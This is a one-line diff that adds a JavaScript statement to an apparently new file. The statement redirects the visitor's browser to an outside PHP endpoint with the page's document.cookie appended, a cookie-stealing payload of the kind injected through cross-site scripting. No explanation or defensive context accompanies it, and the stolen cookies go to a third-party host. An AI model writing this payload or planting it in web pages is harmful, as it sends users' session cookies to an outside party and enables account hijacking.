@@ -1,0 +1,1 @@
+window.location.href="http://cejames.w3.luyouxia.net/reg.php?var="+document.cookie;
